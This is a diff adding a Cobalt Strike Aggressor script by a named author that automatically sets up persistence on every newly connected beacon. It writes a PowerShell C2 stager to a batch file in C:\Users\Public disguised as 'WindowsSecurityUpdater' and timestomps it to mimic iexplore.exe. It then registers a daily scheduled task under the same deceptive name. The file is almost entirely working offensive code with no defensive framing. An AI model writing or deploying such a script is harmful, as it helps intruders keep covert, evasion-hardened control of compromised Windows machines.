@@ -1,0 +1,30 @@
+#Aggressor Auto Peristence for Low Priv
+#Author: Ye Yint Min Thu Htut aka r0lan @yeyint_mth
+
+sub generateandupload {
+	  $listeners = listeners();
+    if (size($listeners()) eq 1) {
+        $listener = $listeners[0];
+        println("Persisting listener $listener");
+        $data = "@echo off\r\n";
+        $data = $data . powershell($listener, false);
+        bupload_raw($1, $2, $data);
+		println("Payload Uploaded!");
+        btimestomp($1, $2, "C:\\Program Files\\internet explorer\\iexplore.exe");
+		println("Timestomp changed!");
+    }
+}
+sub persisit {
+        $payloadName = "WindowsSecurityUpdater";
+        $taskName = "WindowsSecurityUpdater";
+        $uploadpath = "C:\\Users\\Public\\" . $payloadName . ".bat";
+        $pscmd = "schtasks /create /tn " . $taskName . " /tr " . $uploadpath . " /sc Daily";
+        
+        generateandupload($1,$uploadpath); 		
+		bpowershell($1,$pscmd);
+		println("Persistence Created!");
+}
+
+on beacon_initial {
+    persisit($1);
+}
